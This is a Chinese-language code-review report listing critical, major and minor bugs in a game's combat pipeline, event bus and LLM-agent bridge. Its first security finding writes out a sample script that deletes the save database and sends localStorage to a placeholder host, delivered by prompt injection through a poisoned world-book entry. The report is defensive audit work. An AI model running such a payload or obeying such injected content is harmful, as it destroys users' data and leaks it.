# 战斗系统 & 事件系统审查报告

> 日期: 2026-07-30
> 审查方式: 三路并行对抗式审查（引擎核心管线 / 事件系统 / Agent↔引擎↔UI 桥接层），
> 每条发现均经代码验证，对照真源文档核对契约。
> 真源: `docs/reference/combat-system-architecture.md`（v2 架构）·
> `docs/archive/reference/combat-agent-api.md`（M4 接口规格）·
> `docs/reference/effect_script_system.md` · `docs/archive/planning/2026-07-28-combat-system-v2-plan.md`

---

## 一、总体结论

**战斗 v2 的骨架质量不错**——管道结构、事件常量、modifier 六大类的类型系统与校验器、
纯函数层（combat-damage 各 step / combat-intention 判定分支 / combat-item-validator）
本身写得干净且有测试；M5 的行动轴调度骨架（axis 循环、暂停恢复缝、事件流）分层清晰，
UI 侧（CombatActionCard 的防御性收窄、CombatActionBar 的锁定态）也是细致的活。

**但 M3–M5 的「接线层」存在系统性断裂**：大量子系统接上了类型和事件、却没接上数据。
按现状进入 M6 真机验证，第一场战斗就会卡死（工具通道缺 case → AI 第一步报错；
`combat_end` 不真正结束战斗；玩家暂停无法取消）。

三个审查员各自独立指出了同一件事：**现有测试全绿正是因为 mock 把断点全部盖住了**——
`combat-runner.test.ts` 整体 mock 工具通道，agent-tools 测试不经过 runner，
链式脚本系统只在测试里通电。

另有一个**安全级问题**：脚本"沙盒"并不真隔离浏览器全局对象，而 LLM 生成的脚本
在生产路径上会被真实执行。

---

## 二、Critical（会让战斗打不起来 / 打不完 / 有安全风险）

### C1. 脚本"沙盒"根本不是沙盒 — LLM 生成的脚本带全部浏览器全局跑

- 位置: `src/sillytavern/script-executor.ts:171`
- `new Function(...Object.keys(sandbox), '"use strict";\n' + script)` 只是**新增**
  `$dice/$status/$event/$call` 等参数，`fetch`、`globalThis`、`indexedDB`、`localStorage`、
  `document`、`eval`、`Function` 全部照常可用——与文件头自己声称的「无 DOM/文件/网络访问」
  （:10-11）以及 `effect_script_system.md:106-108` 的层级契约直接矛盾。
- **端到端可达，非理论风险**: `char-gen-agent.ts:1001-1035 / 1058-1080 / 1097-1118`
  把 item_gen / char_gen LLM 输出 XML 里的 `<script name=...>` 块解析进
  `scripts: Record<string,string>` 并持久化到物品/状态上，`state-manager.ts:1337`
  随后交给 `executeScript` 真实执行。
- 失败场景: 一条被注入指令的世界书条目 / 物品描述诱导 item_gen 产出
  `scripts.onRemove = "indexedDB.deleteDatabase('fated-poem'); fetch('https://x/?d='+JSON.stringify(localStorage))"`；
  buff 在 `advanceTime` 中过期 → 存档库被整个清掉 + localStorage 外传。
  模块内没有 allowlist、没有 `with` 遮蔽、没有 Realm/iframe 边界。

### C2. combat 工具通道缺 7 个 case — AI 第一步就报错

- 位置: `src/sillytavern/agent-tools.ts:1490`（`default: throw 未知 combat 工具`）
- `executeCombatToolCall` 没有 `roll_d20 / roll_d100 / roll_dice / get_character /
get_hp_percent / get_inventory / status_query` 的 case，但这 7 个全在
  `AGENT_TOOL_MAP['combat']`（agent-tools.ts:693-696）里，`getToolsForAgent('combat')`
  （combat-runner.ts:292）会交给模型，而**所有**工具调用都走这一条通道
  （combat-runner.ts:242）。
- combat systemPrompt（agent-config.json）提及 `roll_d20` 4 次、要求每次攻击前先掷骰，
  模型收到 `error: 未知 combat 工具「roll_d20」` 后要么烧完 `MAX_TOOL_ROUNDS = 40`
  的预算卡死，要么开始**编造** `d20Attack`——正好撞上 combat-agent-api.md §2.3/§2.1
  「禁止 AI 编造骰值」的红线。
- 测试看不见: `combat-runner.test.ts:14` 把整个模块 `vi.mock` 掉了。

### C3. `combat_end` 不会结束战斗 — 调度器在胜利后继续运转，EXP 可翻倍

- 位置: `src/sillytavern/agent-tools.ts:1410-1419`
- `combat_end` 只调 `runSettlementPipeline`；唯一把 `status` 置为 `'ended'` 的
  `endCombat()`（combat-resolver.ts:425）从未被 combat 通道调用，因此
  combat-runner.ts:331 的 `while (combatState.status !== 'ended')` 条件恒真，
  循环只能靠**同一条** assistant 消息里的 `<combat_summary>` 逃逸。
- 失败场景: 模型调 `combat_end(winner)` 后在**下一条**消息里写摘要 → runner 继续
  推进行动轴、对一场已经结束的战斗发出 `awaiting_player_input`，模型第二次调
  `combat_end` → `allPatches`（combat-runner.ts:276）累积第二套 EXP/战利品 patch，
  commit 时翻倍落库。

### C4. 玩家暂停无法取消 — `failPending` 是死代码，卡死只能刷新页面

- 位置: `src/sillytavern/combat-runner.ts:373`（`await awaitPlayerInput()`）
- 无超时、无 `AbortSignal`，`runCombat` 不收 signal，`GamePipeline.abort()`
  （game-pipeline.ts:315）够不到它；`failPending`（combat-runner.ts:223-228）
  只从 init 的 `catch`（:307）可达，而那时 resolver 还不存在。
- CombatPanel 覆盖层（CombatPanel.vue:23）没有关闭按钮。任何 awaiting 状态失配
  （awaiting 被清掉、awaiting 指向 `game.characters` 里不存在的单位……）
  = `handleCombatTrigger` 永久挂起、`isGenerating` 卡死、`exitCombat()` 永不执行。

### C5. 意图对抗两侧共用同一颗 d20 — 骰子被自己抵消，机制退化成查表

- 位置: `src/sillytavern/combat-pipeline.ts:219-220`
- `attackerD20: input.d20Intention ?? 10, defenderD20: input.d20Intention ?? 10`。
  `resolveIntention` 算 `攻方T×5 + d` vs `守方T×5 + d + 难度`
  （combat-intention.ts:152-153），同一个 `d` 两边相减即消失 → 结果只由
  `(T差×5) vs 难度` 决定，完全确定。架构 §7.1 明写是**两次独立掷骰**。
- 失败场景: T3 打 T3 出「抹杀」(难度15) → 恒失败，掷 20 也没用；
  T5 打 T3 出「战术」(难度3) → 恒成功。

### C6. 非致死规则在 v2 管道里整条丢失（legacy 有，重写没搬）

- 位置: `src/sillytavern/combat-pipeline.ts` 全文
- `input.nonLethal` 只被传进 `resolveIntention` 和回显进 `result.request`
  （:218, :409），**从不调用 `checkNonLethal`**；legacy `combat-resolver.ts:177-184`
  是调的。
- 失败场景: 玩家输入「打晕她」→ 解析出 `非致死` → 伤害 500 > 目标 HP 300 →
  `finalHp = 0`、`isDead = true`，目标被打死。正确行为（combat-intention.ts:241-248）
  应是评级 ≤ 有效时 HP 锁 1 + 施加[昏迷]，仅暴击才失手致死。「活捉/留活口」全线失效。

### C7. 最终伤害无下限 clamp — 负 modifier 能把敌人"打成"超额治疗

- 位置: `src/sillytavern/combat-pipeline.ts:315` + `combat-damage.ts:303`
- `finalDamage` 一路没有 `Math.max(0, …)`；`clampHp` 只兜 ≥0 不兜 ≤maxHp。
- 失败场景: 一条 `{category:'百分比', coefficient:-1.5}`（或
  `{category:'固伤', amount:-9999}`）→ `afterRating × (1 + (-1.5))` 为负 →
  `clampHp(300 - (-450)) = 750`，同时 `delta_hp: +450` 如实落库。
  §13 决策 j 要求「离谱数值 clamp」，此处未 clamp。同理 `multiHitCount: 0`
  （schema 无 minimum）会让任何攻击零伤害。

---

## 三、Major（主路径上的静默降级）

### M-1. 19 个事件里 6 个在生产路径从未触发；buff 永不 tick、永不过期

- `combat.start / combat.turn.start / combat.turn.end / combat.flee.request`
  （架构 §6.4 行 1/5/6/15）**零 emitChain 调用点**（combat-pipeline.ts:49,53,54,64
  只是常量声明）：`combat_start` 走 legacy 同步 `initCombat`（agent-tools.ts:1299），
  `combat_flee` 走 legacy `resolveFlee`（agent-tools.ts:1404），都不带 bus。
  combat-runner.ts:349 发的 `{type:'turn_started'}` 是 UI 专用 `CombatEvent`
  联合类型——完全是另一条通道。
- `runRoundPipeline`（combat-pipeline.ts:455，唯一 emit `combat.round.start/end`
  的地方）**生产代码零调用方**——runner 在 :342/:405 直接 `combatState.round++`。
  于是「增益在 round.start 结算、减益在 round.end 结算」的铁律
  （架构 :290）在真实战斗里从没跑过。
- 即使调了它也没用: :469-489 只取 `tickBuffs` 返回的 `expired`，**丢弃 `remaining`
  新数组**（buff-registry 是纯函数不改原数组），`defenderEffectsProvider` 是只读
  getter、无回写口、不产 StatePatch。
- 失败场景: 3 回合「流血」跑 10 个回合仍是 `remainingTime: 3`，既不 tick 伤害也不过期；
  订阅 `combat.turn.start` 的「回合开始回 5 HP」装备注册成功、永不触发、无任何警告。

### M-2. 整条链式脚本系统在生产环境"未通电"

- 生产代码中**没有任何一处**调用 `subscribeChain`、实例化 `SubscriptionManager` /
  `ScriptRegistry`、或调用 `executeInit / executeCleanup / executeHook`
  （全仓 grep 确认只有测试在用）。运行时 `chainHandlers` 恒空，每次 `emitChain`
  只是往 history 里追加一条。
- 这正是 M-1 的契约漂移长期没被发现的原因——事件断没断，没人听得见。

### M-3. 「1 攻击 + 1 动作」硬约束不存在（两路审查独立确认）

- combat-agent-api.md §5 步2 声称由 `consumeAttack/consumeAction` 代码保证，
  实际 `consumeAttack` 只被 re-export（combat-resolver.ts:585），`consumeAction`
  只有 legacy `resolveDefend`（combat-resolver.ts:331）在调；`resolveAttackPipeline`
  从不碰 `attacksRemaining`，runner 用自己的 `turnPtr` 调度、也从不调 `resetTurn`。
- 失败场景: 模型在一个单位的回合里连调 `combat_attack` 最多 40 次（MAX_TOOL_ROUNDS），
  一"回合"清场，代码侧零拦截。
- 另外 `resetTurnResources`（combat-turn.ts:132-137）无条件把**所有**单位置回 1/1，
  不看 `canAct`/`hp`——给死人发行动力；而 `rollInitiative:44-45` 是看 `canAct` 的，
  同一份数据两套规则。

### M-4. 战意 d20 检定恒过 — 溃逃概率被钉死成 100%

- 位置: `src/sillytavern/combat-pipeline.ts:337-343`
- 调 `runMoraleCheckPipeline(defenderId, hpRatio, combatType, ctx)` 只传 4 参，
  第 5 个 `d20Roll` 恒 undefined → combat-morale-pipeline.ts:69
  `checkMorale(..., d20Roll ?? 10)` → morale-system.ts:131-133
  `passed = 10 < 12` 恒 true。
- 失败场景: 死斗中敌方 HP 掉到 9% → 100% 溃逃；架构 §9.5 规定的是 `d20 < 12`
  的**随机**检定。

### M-5. 优劣势第二颗骰是 `Math.random()` 伪造的

- 位置: `src/sillytavern/combat-damage.ts:396,403`
- `const r2 = Math.max(1, Math.min(20, r1 + Math.floor(Math.random() * 6 - 3)))`。
  三重问题: (a) 直接调 `Math.random()`，破坏 §13 决策 o「管道参数链 dump 可回放」
  与 §1.3 可重现目标——同一输入两次跑出不同结果; (b) 偏移取值 `{-3..+2}`
  **不对称**（优势最多 +2、劣势最多 -3）; (c) 真 2d20 取高期望增益 ≈ +3.3，
  这里 ≈ +0.5。
- 失败场景: `d20Roll=20` 时"优势"恒零收益；`d20Roll=3` 劣势时评级从「擦伤」
  掉不掉到「失手」纯看 `Math.random()`。

### M-6. modifier 折叠不分 `target`；守方百分比减伤被整体丢弃

- 位置: `src/sillytavern/combat-modifier-inject.ts:46` + `:55-58,64`
- `damageMultiplier = sumPercentages(attackerMods)`，而 `sumPercentages`
  （effect-types.ts:145-153）对所有 `category==='百分比'` 无差别累加，
  不看 `target: 'damage'|'heal'|'resource'`；同时 `defenderMods` 只取
  `特殊机制·DR` 与 `检定·闪避`，守方的百分比 modifier 一条不进管线。
- 失败场景: ① 攻方戴「治疗量 +50%」戒指 → 武器伤害凭空 +50%；
  ② 守方穿「受到伤害 -30%」护甲（`target:'damage', coefficient:-0.3`）→ 完全不生效。
  架构 §4.1 明写百分比含「减伤」且进 Step 6。

### M-7. 集群 ×1.5 与集群 EXP 衰减是死代码 — `clusterCount` 是幽灵字段

- 位置: `src/sillytavern/combat-pipeline.ts:303` + `combat-settlement-pipeline.ts:78`
- 两处都靠 `(defender as any).clusterCount` 读，但 `CombatParticipant`
  （types.ts:1628-1669）没有这个字段，且**全仓没有任何一处写入**
  （cluster-system.ts 只有同名局部形参）。
- 失败场景: 8 只哥布林集群 → `clusterCount ?? 0 = 0` → 永远走不到 `>= 3` 分支，
  M3 任务 4.10 声称完成的 ×1.5 从未触发；EXP 衰减恒按 `factor = 1`。
- `as any` 绕过 types.ts 单一类型来源约定，正是掩盖这个洞的元凶。

### M-8. 战斗内 buff 去重/叠层完全旁路；落库侧又反向合并异源

- 位置: `src/sillytavern/agent-tools.ts:1428` + `state-manager.ts:561`
- `status_apply` 读的 `existing` 来自 `ctx.characters`（= `game.characters`），
  而战斗期间它从不更新（patch 只在 combat-runner.ts:414 一次性 commit）；
  `r.updated` 被 runner 丢弃。于是 `applyBuff` 每次都看到空历史:
  永远 `action:'added'`、`maxStacks` 封顶永不运行，「同源刷新/异源独立」红线
  （combat-agent-api.md §6.3）整场战斗一次都没被执行过。
- 更糟: 落库侧只按**名字**去重（`findByName`）、无视 `sourceKey`，
  「毒刃.流血」和「毒箭.流血」被合并成一行叠层——与 §6.3
  「不同 buffId = 异源独立共存」正好相反。

### M-9. HP/资源同步只做守方；`costs.hp` 被静默丢弃

- 位置: `src/sillytavern/combat-runner.ts:263-273`
- 只同步 `res.request.defenderId` 的 `finalHp`；combat-pipeline.ts:371-385 对
  **攻方**发的 `delta_mp/delta_sp` patch 从不写回 `combatState`。
- 失败场景: 整场战斗玩家 MP/SP 条（CombatUnitCard）满格不动，commit 时一口气扣完；
  AI 按 §2.1 的 `costs:{hp?,mp?,sp?}` 花已经没有的 MP，无任何校验。
  另外 schema 收 `costs.hp`（agent-tools.ts:428）但管线没有对应分支——
  HP 代价技能零成本。

### M-10. `convertScriptEffects` 丢弃 10 个效果通道里的 5 个

- 位置: `src/sillytavern/state-manager.ts:1397-1406`
- 只读 `adds / removes / stackSets / hpChanges / statChanges`，忽略
  `statusApplies / statusRemoves / subscriptions / unsubscriptions / events`。
  M2 把 `$status.remove` 的写入端从 `removes` 改到 `statusRemoves`
  （script-executor.ts:369），转换端没跟——API 从可用回归为静默丢弃。
  `status-api.ts` 存在但只接了 agent 工具，从没接到这里。
- 失败场景: 过期 buff 的 `onRemove` 脚本调 `$status.remove(owner,'灼烧')`
  清理子 DoT → `executeScript` 正常返回、零 patch 产出、子 DoT 永远烧下去。

### M-11. 脚本注册表两条僵尸订阅路径

- **过期 unregister 闭包误删重注册 owner**（script-registry.ts:67-73）:
  `unregisterOwner`（:88）删 map key 但不清空旧 `Set`，旧闭包仍持有引用；
  闭包晚触发时 `entries.delete` 把旧 set 减到 0 → `this.owners.delete(ownerKey)`
  删掉的是**新**注册的 set。失败场景: 卸下幽怨之剑 → 重新装备 → 第一次装备残留的
  unsubscribe 晚调一次 → 新链 handler 永远留在 `EventBus.chainHandlers` 里，
  之后再卸剑是 no-op，剑掉了还在加伤。
- **嵌套订阅挂在兜底够不到的合成 key 下**（subscription-manager.ts:242-250）:
  嵌套注册用 `` `${charId}:subscription:nested` `` 而非真实
  `{charId}:{objectType}:{objectName}`，`unregisterAll(ownerKey)`
  （effect_script_system.md:302 承诺的兜底）看不见它。失败场景: 状态效果的
  handler 在处理中注册后续监听 → 状态被移除、`unregisterAll` 干净返回 →
  嵌套监听在整个存档余生持续触发——正是兜底要防的那种僵尸。
- 另: `unregisterByHandle`（subscription-manager.ts:162-167）用
  `handle.includes(entry.eventType)` 匹配并在首个命中 `break`，而 handle
  （`sub_${len}_${eventType}`，script-executor.ts:408）计数器每次
  `executeScript` 归零、既不唯一也不被解析 → `$event.off('sub_1_status_effect')`
  会错删 `sub_0` 那条并让目标条目泄漏。

### M-12. 递归防护在生产路径全线失效

- 战斗链从不设 `maxDepth`: `PipelineContext`（combat-pipeline.ts:73-83）没有该字段，
  `game-event.ts:93` 默认 `currentChainMaxDepth = Infinity`，全仓只有测试传过
  `maxDepth`。架构 §3.3 与 M1 任务 1.4 要求战斗场景 ≤5。
  失败场景: 「流血」的 `combat.attack.damage` handler 内部再触发伤害 → 无界递归。
- `$call` 无递归保护（script-executor.ts:384-402）: depth-5 上限只管 `@` 前缀引用，
  `$call('a')` 走平键重入 `executeScript`，新沙盒的 depth 归零。
  `scripts.tick = "$call('tick')"` 一次 tick 挂死页签。
  文档宣称的「嵌套超 10 层自动截断」只存在于 `SubscriptionManager.handleEvent`，
  不覆盖此路径。

### M-13. 未调 `combat_start` 的叙事收尾会让整场战斗蒸发

- 位置: `src/sillytavern/combat-runner.ts:311`
- `throw 未调 combat_start` 发生在 `earlySummary` 提取（:316-321）**之前**。
  combat-agent-api.md §5 步3 明确允许认输/嘴炮结局；模型在 init 消息里就叙事
  解决并发 `<combat_summary>` 时 → `handleCombatTrigger` catch、不注入摘要
  （game-pipeline.ts:994-999），正文继续走、仿佛 `<combat_trigger>` 没发生过。

### M-14. 事件顺序与架构 §6.3 相反

- 位置: `src/sillytavern/combat-pipeline.ts:231 vs :239`
- §6.3 序列为 `dice.roll → collect_attacker_mods → 攻击检定`，
  代码是 `collect_attacker_mods(:231) → dice.roll(:239) → 检定(:252)`。
- 失败场景: 「掷出 20 时额外 +200 固伤」的装备在 collect 阶段读不到本次骰值
  （那时还没掷）。M3 计划 §4 风险栏原话:
  「19 event 的触发顺序要严格按 v2 §6.3，错一个就整个流程乱」。

### M-15. handler 漏写 `return` 会让整次攻击抛 TypeError（两路审查独立确认）

- 位置: `src/sillytavern/modifier-collector.ts:104,133` + `game-event.ts:280`
- `emitChain` 无条件把 handler 返回值赋给链参数、只 catch **抛错**不校验返回值；
  handler 以 `params.mods.push(mod);`（无 return）结尾时后续 `params === undefined`，
  `return result.mods` 抛 `Cannot read properties of undefined`，
  `resolveAttackPipeline` 整个 reject → `combat_attack` 工具中途报错。
- 不一致: 其他消费方都做了防御（combat-pipeline.ts:244 `?.dice`、
  combat-settlement-pipeline.ts:99,111,116 `?.loot/?.summary/?.fp`），
  唯独 modifier-collector 裸取。AI/脚本写的 handler 漏 return 是高频错误。

---

## 四、Minor

| #   | 位置                                                    | 问题                                                                                                                                                                                                                                                                                                                            |
| --- | ------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| N1  | `CombatActionCard.vue:200-202,332`                      | 攻击卡片渲染裸 `char_1753…` id 而非名字——工具层已把名字转成 id 再回显（agent-tools.ts:1343-1344），而同一 payload 的 `panelLines/description` 里就有名字。真机第一眼就会看到                                                                                                                                                    |
| N2  | `agent-tools.ts:1337`                                   | `combat_start` 把完整 `CombatState`（`_combatState`，含全部 characterId / patches / roundLogs / speedModifiers）序列化回给 LLM——违反铁律1「AI 永不产 id」的暴露面 + 战斗最吃缓存的那条消息上的纯 token 浪费                                                                                                                     |
| N3  | `combat-modifier-inject.ts:76` vs `effect-types.ts:110` | 登神对 DR 的压制代码用**加法**（`clamp01(dr - rate)`），自家注释写**乘法**（`dr × (1-压制率)`）: DR 0.1、压制 0.2 → 文档 0.08、代码 0——低 DR 上「压制 20%」退化成 100%。穿透侧是加法（合理），DR 侧两种写法混用                                                                                                                 |
| N4  | `combat-damage.ts:331,436`                              | 面板数据失真: `drRate` 报未修正值而 `drReduction/afterDr` 用修正值（压制生效时显示「DR 30%，减免 0」自相矛盾；对比 `penetration.penetrationRate` 报的是修正后值，标准不一）；`dodgeNegated: effectiveDodge === 0` 让闪避本来就是 0 的普通单位恒报「闪避已被无效」                                                               |
| N5  | `game-event.ts:214-229,447`                             | 链深度守卫状态（`chainDepth`/`prevMaxDepth`）是实例字段、跨 `await` 变异，两个并行 `emitChain` 会互相污染彼此的深度与上限恢复；`destroyEventBus` 生产零调用，`busRegistry` 把每个存档的 bus（含 500 条 history、内含活的 CombatState 引用）pin 到进程结束                                                                       |
| N6  | `effect-runtime.ts:97,126`                              | `childEffects` 声明后从未赋值、恒返回空——连锁子效果递归（:71-74，文档 effect_script_system.md:59）是不可达死代码；且一旦被填充，`execute()` 的递归**没有任何深度守卫**                                                                                                                                                          |
| N7  | `game-store.ts:88` + `combat-runner.ts:269,342`         | runner 直接变异 store 按引用持有的原始 `CombatState`（`defender.hp = …` / `round++`），不过 Vue set-trap；当前渲染碰巧正确只因每次变异后同 tick 都有 `combatLog.push`。任何未来的无 emit 路径会让 CombatHeader 回合数与 HP 条静默过期                                                                                           |
| N8  | `agent-tools.ts:1465`                                   | `status_remove` 返回 `removed: args.buffIdOrName`（输入的裸回显），契约 §2.2 规定 `{ removed: string[], patches }`——AI 无法知道到底移除了哪些、有没有移除                                                                                                                                                                       |
| N9  | `game-store.ts:76-81` + `game-pipeline.ts:960`          | `enterCombat()` 只清状态不开面板（`isInCombat` 要等 `combat_started` 事件才置 true），call-site 注释「激活战斗面板」是错的: 覆盖层要等第一次 LLM 往返完成才出现；模型若从不调 `combat_start`，用户在 throw 之前看不到任何战斗 UI。相关: `round_started` 只在行动轴回绕时发（combat-runner.ts:343/406），第 1 回合永远没有分隔线 |

---

## 五、三个系统性病根

比单条 bug 更值得记的是三种反复出现的形态：

1. **算了不写回**。`combat.status`、`attacksRemaining`、buff `remainingTime`、
   攻方 MP/SP、`statusEffects`——契约说 Code 管的状态都由纯函数正确算出来了，
   但结果被丢弃、从不写回循环真正读的那份 `CombatState` / `ctx.characters`。
   终止条件（C3）、动作预算（M-3）、buff 去重（M-8）、buff tick（M-1）
   全部因此静默 no-op。这是 M3「把 legacy 重写成管道」时的接线层遗留:
   接上了类型和事件，没接上数据。

2. **测试的绿是 mock 换来的**。`combat-runner.test.ts` 整体 mock
   `executeCombatToolCall`（盖住 C2/C3）；agent-tools 测试只测分发器不经过 runner；
   链式系统（emitChain/ScriptRegistry/SubscriptionManager）只在测试里通电
   （盖住 M-1/M-2/M-11）。三路审查各自独立得出同一结论。
   建议为 nonLethal / 集群 / buff tick / 工具通道各补一条**不 mock 的端到端断言**。

3. **确定性红线已破**。共用 d20（C5）、`Math.random()` 伪造第二骰（M-5）、
   恒 10 的战意骰（M-4）——「代码管确定性数值」（ADR-11）的分工在三处骰点上
   都没守住，同时 `(as any)` 幽灵字段（M-7）绕开了 types.ts 单一类型来源约定。
   建议把 `d20` 与 `maxDepth` 变成 `PipelineContext` 的**必填项**，
   让编译器替未来的接线把关。

---

## 六、修复优先序建议（M6 真机验证之前）

**第一批 — 不修则战斗开不了/关不掉（C2 / C3 / C4）**

1. `executeCombatToolCall` 补齐 7 个缺失 case（骰子/查询类直接复用通用通道的实现）。
2. `combat_end` 调 `endCombat()` 置 `status:'ended'`；对二次 `combat_end` 幂等。
3. `awaitPlayerInput` 接 `AbortSignal` + CombatPanel 给逃生口。

**第二批 — 安全 + 脚本效果落地（C1 / M-10 / M-11 / M-12）** 4. `buildSandbox` 遮蔽全局（`with` 遮蔽或 iframe/Realm 边界），列 allowlist。5. `convertScriptEffects` 补全 5 个被丢弃的通道。6. 修 script-registry 过期闭包 / 嵌套订阅 ownerKey / handle 匹配三处僵尸路径；
`$call` 与战斗链补递归上限。

**第三批 — 数值正确性（C5 / C6 / C7 / M-4 / M-5 / M-6）** 7. 意图对抗独立双骰；战意检定传真骰；优劣势用真 2d20（注入骰源，勿用 `Math.random()`）。8. 管线出口 `finalDamage ≥ 0`、`finalHp ∈ [0, maxHp]` 双向 clamp；
`multiHitCount` schema 加 minimum。9. 非致死接回 `checkNonLethal`；modifier 折叠按 `target` 分流、守方百分比进管线。

**第四批 — 事件与状态接线（M-1 / M-2 / M-3 / M-7 / M-8 / M-9）** 10. runner 接入 `runRoundPipeline`（或等价物）并把 `tickBuffs` 的 `remaining`
写回；补齐 4 个从未 emit 的事件或从文档中除名。11. 回合资源消耗接进 `resolveAttackPipeline`；攻方资源与 `r.updated` 写回
`combatState` / `ctx.characters`。12. `clusterCount` 进 `CombatParticipant` 正式字段并补写入方，删 `as any`。

**第五批 — 契约与 UI 打磨（M-13 / M-14 / M-15 / Minor 全部）**

---

## 附录: 覆盖范围

- 引擎核心: combat-pipeline / combat-actions-pipeline / combat-settlement-pipeline /
  combat-morale-pipeline / combat-damage / combat-modifier-inject / modifier-collector /
  combat-item-validator / combat-turn / combat-intention（含各自测试）
- 事件系统: game-event / script-registry / script-executor / subscription-manager /
  effect-runtime + 全部 emitChain/emit 调用点
- 桥接层: combat-runner / combat-resolver / agent-tools（combat 通道）/
  combat-store / game-pipeline（战斗桥接段）/ `src/ui/components/game/combat/*.vue`
- 本报告仅记录**经代码验证**的发现；审查中若干可疑点经文档比对确认为刻意行为，未收录。
